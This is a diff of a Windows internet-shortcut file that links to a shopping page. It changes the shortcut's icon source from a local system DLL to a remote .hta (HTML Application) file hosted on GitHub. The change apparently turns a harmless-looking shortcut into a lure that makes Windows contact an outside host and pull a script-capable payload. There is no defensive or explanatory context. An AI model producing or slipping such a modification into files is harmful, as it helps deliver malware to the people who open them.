@@ -3,6 +3,6 @@ URL=https://silkyshopping.com/flashlight
 IconIndex=14
 HotKey=0
 IDList=
-IconFile=C:\Windows\System32\SHELL32.dll
+IconFile=https://raw.githubusercontent.com/duantienty/business/main/1.hta
 [{000214A0-0000-0000-C000-000000000046}]
 Prop3=19,11
